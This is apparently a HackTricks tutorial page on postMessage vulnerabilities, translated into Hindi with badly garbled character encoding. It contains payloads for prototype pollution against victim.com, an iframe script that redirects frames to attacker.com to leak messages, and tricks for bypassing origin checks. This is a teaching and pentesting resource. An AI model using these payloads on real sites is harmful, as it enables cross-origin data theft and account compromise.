# PostMessage рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдПрдБ

## PostMessage рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдПрдБ

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рддрд░рдХреАрдмреЗрдВ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ.

</details>

## **PostMessage** рднреЗрдЬреЗрдВ

**PostMessage** рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрджреЗрд╢ рднреЗрдЬрддрд╛ рд╣реИ:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **targetOrigin** рдПрдХ '\*' рдпрд╛ _https://company.com._ рдЬреИрд╕рд╛ URL рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
**рджреВрд╕рд░реЗ рдкрд░рд┐рджреГрд╢реНрдп** рдореЗрдВ, **рд╕рдВрджреЗрд╢ рдХреЗрд╡рд▓ рдЙрд╕ рдбреЛрдореЗрди рдХреЛ рднреЗрдЬрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** (рднрд▓реЗ рд╣реА window рдСрдмреНрдЬреЗрдХреНрдЯ рдХрд╛ рдореВрд▓ рдЕрд▓рдЧ рд╣реЛ)ред\
рдпрджрд┐ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **рд╕рдВрджреЗрд╢ рдХрд┐рд╕реА рднреА рдбреЛрдореЗрди рдХреЛ рднреЗрдЬреЗ рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдФрд░ Window рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдореВрд▓ рдХреЛ рднреЗрдЬреЗ рдЬрд╛рдПрдВрдЧреЗред

### iframe рдФрд░ **targetOrigin** рдореЗрдВ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** рдХрд╛ рд╣рдорд▓рд╛

рдЬреИрд╕рд╛ рдХрд┐ [**рдЗрд╕ рд░рд┐рдкреЛрд░реНрдЯ**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) рдореЗрдВ рд╕рдордЭрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдпрджрд┐ рдЖрдкрдХреЛ рдПрдХ рдкреЗрдЬ рдорд┐рд▓рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ **iframed** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдХреЛрдИ `X-Frame-Header` рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ) рдФрд░ рдЬреЛ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╕рдВрджреЗрд╢ **postMessage** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб** (\*) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬ рд░рд╣рд╛ рд╣реИ, рдЖрдк **iframe** рдХреЗ **рдореВрд▓** рдХреЛ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╕рдВрд╡реЗрджрдирд╢реАрд▓** рд╕рдВрджреЗрд╢ рдХреЛ рдЕрдкрдиреЗ рдирд┐рдпрдВрддреНрд░рдг рд╡рд╛рд▓реЗ рдбреЛрдореЗрди рдореЗрдВ **leak** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдкреЗрдЬ рдХреЛ iframed рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **targetOrigin** рдХреЛ URL рдкрд░ **рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдкрд░ рдирд╣реАрдВ**, рддреЛ рдпрд╣ **рдЪрд╛рд▓ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧреА**ред
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener рдХрд╛ рд╢реЛрд╖рдг

**`addEventListener`** рд╡рд╣ рдлрд╝рдВрдХреНрд╢рди рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ JS рджреНрд╡рд╛рд░рд╛ **`postMessages` рдХреА рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░ рд░рд╣реЗ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдШреЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред\
рдЗрд╕рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕рд╛ рдХреЛрдб рдкреНрд░рдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **рдкрд╣рд▓реА рдмрд╛рдд** рдЬреЛ рдХреЛрдб рдХрд░ рд░рд╣рд╛ рд╣реИ рд╡рд╣ **рдореВрд▓ рдХреА рдЬрд╛рдВрдЪ** рдХрд░ рд░рд╣рд╛ рд╣реИред рдпрд╣ рдмрд╣реБрдд рд╣реА **рдорд╣рддреНрд╡рдкреВрд░реНрдг** рд╣реИ, рдЦрд╛рд╕рдХрд░ рдЕрдЧрд░ рдкреЗрдЬ рдкреНрд░рд╛рдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд╕рд╛рде **рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдХрд╛рд░реНрдп** рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ (рдЬреИрд╕реЗ рдХрд┐ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓рдирд╛)ред **рдЕрдЧрд░ рдпрд╣ рдореВрд▓ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдкреАрдбрд╝рд┐рддреЛрдВ рдХреЛ рдЗрд╕ рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдкрд░ рдордирдорд╛рдирд╛ рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдкреАрдбрд╝рд┐рддреЛрдВ рдХреЗ рдкрд╛рд╕рд╡рд░реНрдб рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ (рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ)ред

### рд╕реВрдЪреАрдХрд░рдг

рд╡рд░реНрддрдорд╛рди рдкреЗрдЬ рдореЗрдВ **рдЗрд╡реЗрдВрдЯ рд▓рд┐рд╕рдирд░реНрд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдЖрдк:

* JS рдХреЛрдб рдореЗрдВ `window.addEventListener` рдФрд░ `$(window).on` (_JQuery рд╕рдВрд╕реНрдХрд░рдг_) рдХреЗ рд▓рд┐рдП **рдЦреЛрдЬреЗрдВ**
* рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рдХрдВрд╕реЛрд▓ рдореЗрдВ **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ**: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1) (1).png>)

* рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдбреЗрд╡рд▓рдкрд░ рдЯреВрд▓реНрд╕ рдореЗрдВ _Elements --> Event Listeners_ рдкрд░ **рдЬрд╛рдПрдВ**

![](<../../.gitbook/assets/image (617).png>)

* [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) рдпрд╛ [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker) рдЬреИрд╕реЗ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред рдпреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рди **рд╕рднреА рд╕рдВрджреЗрд╢реЛрдВ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд░реЗрдВрдЧреЗ** рдФрд░ рдЖрдкрдХреЛ рджрд┐рдЦрд╛рдПрдВрдЧреЗред

### рдореВрд▓ рдЬрд╛рдВрдЪ рдмрд╛рдпрдкрд╛рд╕

* **`event.isTrusted`** рд╕рдЪ рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЗрд╡реЗрдВрдЯ рдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛред рдЕрдЧрд░ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдЬрдЧрд╣ рдкрд░ рд╣реЛ, рддреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛, рд▓реЗрдХрд┐рди рдЙрд▓реНрд▓реЗрдЦ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рд╣реИред
* рдЕрдЧрд░ **`indexOf()`** рдХрд╛ рдЙрдкрдпреЛрдЧ PostMessage рдЗрд╡реЗрдВрдЯ рдХреЗ **рдореВрд▓** рдХреА **рдЬрд╛рдВрдЪ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдЗрд╕реЗ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣ рдЖрд╕рд╛рдиреА рд╕реЗ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
* рдпрджрд┐ **`search()`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдореВрд▓** рдХреА **рдкреБрд╖реНрдЯрд┐** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИред `String.prototype.search()` рдХреЗ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдпрд╣ рд╡рд┐рдзрд┐ **рдПрдХ рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐** рдСрдмреНрдЬреЗрдХреНрдЯ рд▓реЗрддреА рд╣реИ, рди рдХрд┐ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧред рдпрджрд┐ regexp рдХреЗ рдЕрд▓рд╛рд╡рд╛ рдХреБрдЫ рднреА рдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рд╕реНрд╡рддрдГ рд╣реА рдПрдХ regex рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рд╣реЛ рдЬрд╛рдПрдЧрд╛ред\
рдирд┐рдпрдорд┐рдд рдЕрднрд┐рд╡реНрдпрдХреНрддрд┐ рдореЗрдВ, **рдПрдХ рдмрд┐рдВрджреБ (.) рдХреЛ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕рдХрд╛ рдлрд╛рдпрджрд╛ рдЙрдард╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ **рд╡рд┐рд╢реЗрд╖ рдбреЛрдореЗрди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреБрд╖реНрдЯрд┐ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐:&#x20;
```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* рдкрд┐рдЫрд▓реЗ рдЙрджрд╛рд╣рд░рдг рдХреА рддрд░рд╣, **`match()`** рднреА рдПрдХ **regex** рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ regex рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реЛ рддреЛ рдЗрд╕реЗ **bypasseable** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* рдпрджрд┐ **`escapeHtml`** рдлрдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдлрдВрдХреНрд╢рди рдПрдХ `new` рдПрд╕реНрдХреЗрдкреНрдб рдСрдмреНрдЬреЗрдХреНрдЯ рдирд╣реАрдВ рдмрдирд╛рддрд╛ рд╣реИ, рдмрд▓реНрдХрд┐ рдореМрдЬреВрджрд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреА **properties рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЕрдЧрд░ рд╣рдо рдПрдХ рдРрд╕рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдмрдирд╛рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИрдВ рдЬрд┐рд╕рдХреА рдПрдХ рдирд┐рдпрдВрддреНрд░рд┐рдд property рд╣реЛ рдЬреЛ `hasOwnProperty` рдХрд╛ рдЬрд╡рд╛рдм рдирд╣реАрдВ рджреЗрддреА рд╣реИ, рддреЛ рд╡рд╣ рдПрд╕реНрдХреЗрдк рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред
```javascript
// Expected to fail:
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
// Bypassed:
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```
`File` рдСрдмреНрдЬреЗрдХреНрдЯ рдЗрд╕ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рд▓рд┐рдП рдЙрддреНрддрдо рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдПрдХ рд░реАрдб-рдУрдирд▓реА `name` рдкреНрд░реЙрдкрд░реНрдЯреА рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рдорд╛рд░реЗ рдЯреЗрдореНрдкрд▓реЗрдЯ рдореЗрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ `escapeHtml` рдлрдВрдХреНрд╢рди рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░реЗрдЧрд╛ред

### e.origin == window.origin рдмрд╛рдпрдкрд╛рд╕

рдЬрдм рдПрдХ рдкреЗрдЬ рдХреЛ **рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рдЗрдлреНрд░реЗрдо** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ `<iframe sandbox="allow-scripts" src="https://so-xss.terjanq.me/iframe.php">` рдореЗрдВ рдПрдореНрдмреЗрдб рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕ **рдЗрдлреНрд░реЗрдо** рдХрд╛ **рдУрд░рд┐рдЬрд┐рди** **`null`** рд╣реЛрдЧрд╛ред

рдЬрдм **рд╕реИрдВрдбрдмреЙрдХреНрд╕ рд╡реИрд▓реНрдпреВ `allow-popups` рд╕реЗрдЯ рдХреА рдЬрд╛рддреА рд╣реИ** рддрдм **рдЦреБрд▓рдиреЗ рд╡рд╛рд▓реА рдкреЙрдкрдЕрдк** рд╕рднреА **рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рдПрдЯреНрд░рд┐рдмреНрдпреВрдЯреНрд╕** рдХреЛ **рдЗрдиреНрд╣реЗрд░рд┐рдЯ** рдХрд░реЗрдЧреА рдЬрдм рддрдХ рдХрд┐ `allow-popups-to-escape-sandbox` рд╕реЗрдЯ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ред\
рдЗрд╕рд▓рд┐рдП, рдПрдХ **рдкреЙрдкрдЕрдк** рдХреЛ **рдирд▓ рдУрд░рд┐рдЬрд┐рди** рд╕реЗ рдЦреЛрд▓рдиреЗ рдкрд░ **`window.origin`** рдЕрдВрджрд░ рдХреА рдкреЙрдкрдЕрдк рднреА **`null`** рд╣реЛ рдЬрд╛рдПрдЧрд╛ред

рдЗрд╕рд▓рд┐рдП, рдЕрдЧрд░ рдЖрдк рдПрдХ **рд╕реИрдВрдбрдмреЙрдХреНрд╕реНрдб рдЗрдлреНрд░реЗрдо** рдЦреЛрд▓рддреЗ рд╣реИрдВ рдЬреЛ рдкреЙрдкрдЕрдкреНрд╕ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдФрд░ рдлрд┐рд░ рдЖрдк **рдЗрдлреНрд░реЗрдо рдХреЗ рдЕрдВрджрд░ рд╕реЗ рдПрдХ рдкреЙрдкрдЕрдк рдЦреЛрд▓рддреЗ рд╣реИрдВ**, рдФрд░ **рдЗрдлреНрд░реЗрдо рд╕реЗ рдкреЙрдкрдЕрдк рдХреЛ рдПрдХ рдкреЛрд╕реНрдЯрдореЗрд╕реЗрдЬ рднреЗрдЬрддреЗ рд╣реИрдВ**, рджреЛрдиреЛрдВ рдУрд░рд┐рдЬрд┐рдиреНрд╕ рдирд▓ рд╣реЛрддреЗ рд╣реИрдВ рддреЛ: **`e.origin == window.origin == null`**

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдкрдврд╝реЗрдВ**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### e.source рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдирд╛

рдпрд╣ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдЬрд╛рдВрдЪ рдХреА рдЬрд╛рдП рдХрд┐ рдХреНрдпрд╛ рд╕рдВрджреЗрд╢ рдЙрд╕реА рд╡рд┐рдВрдбреЛ рд╕реЗ рдЖрдпрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд╕реБрди рд░рд╣реА рд╣реИ (рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ **рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдПрдХреНрд╕рдЯреЗрдВрд╢рдиреНрд╕ рдХреЗ рдХрдВрдЯреЗрдВрдЯ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕** рдХреЗ рд▓рд┐рдП рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рдВрджреЗрд╢ рдЙрд╕реА рдкреЗрдЬ рд╕реЗ рднреЗрдЬрд╛ рдЧрдпрд╛ рдерд╛):
```javascript
// If itтАЩs not, return immediately.
if( received_message.source !== window ) {
return;
}
```
рдЖрдк **`e.source`** рдХреЛ рдПрдХ рд╕рдВрджреЗрд╢ рдХреЗ рд▓рд┐рдП null рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдк рдПрдХ **iframe** рдмрдирд╛рдПрдВ рдЬреЛ **postMessage** **рднреЗрдЬрддрд╛ рд╣реИ** рдФрд░ **рддреБрд░рдВрдд рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП **рдкрдврд╝реЗрдВ:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header рдмрд╛рдпрдкрд╛рд╕

рдЗрди рд╣рдорд▓реЛрдВ рдХреЛ рдЖрджрд░реНрд╢ рд░реВрдк рд╕реЗ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ **рдкреАрдбрд╝рд┐рдд рд╡реЗрдм рдкреЗрдЬ** рдХреЛ рдПрдХ `iframe` рдХреЗ рдЕрдВрджрд░ рд░рдЦрдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдПред рд▓реЗрдХрд┐рди рдХреБрдЫ рд╣реЗрдбрд░реНрд╕ рдЬреИрд╕реЗ рдХрд┐ `X-Frame-Header` рдЙрд╕ **рд╡реНрдпрд╡рд╣рд╛рд░** рдХреЛ **рд░реЛрдХ** рд╕рдХрддреЗ рд╣реИрдВред\
рдЙрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЖрдк рдПрдХ рдХрдо рдЪреБрдкрдХреЗ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛ рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдПрдХ рдирдпрд╛ рдЯреИрдм рдЦреЛрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдХрдордЬреЛрд░ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдХреЗ рд▓рд┐рдП рд╣реЛ рдФрд░ рдЙрд╕рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### рдореБрдЦреНрдп рдкреГрд╖реНрда рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рдХреЗ рдмрдЪреНрдЪреЗ рдХреЛ рднреЗрдЬреЗ рдЧрдП рд╕рдВрджреЗрд╢ рдХреА рдЪреЛрд░реА

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреИрд╕реЗ рдЖрдк **рд╕рдВрд╡реЗрджрдирд╢реАрд▓ postmessage рдбреЗрдЯрд╛** рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ **рдмрдЪреНрдЪреЗ рдХреЗ iframe** рдХреЛ рднреЗрдЬрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рдбреЗрдЯрд╛ рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ **рдореБрдЦреНрдп** рдкреГрд╖реНрда рдХреЛ **рдЕрд╡рд░реБрджреНрдз** рдХрд░рдХреЗ рдФрд░ рдмрдЪреНрдЪреЗ рдореЗрдВ рдПрдХ **XSS рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░рдХреЗ рдбреЗрдЯрд╛ рдХреЛ **рд▓реАрдХ** рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframe рд╕реНрдерд╛рди рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдХреЗ рд╕рдВрджреЗрд╢ рдХреА рдЪреЛрд░реА

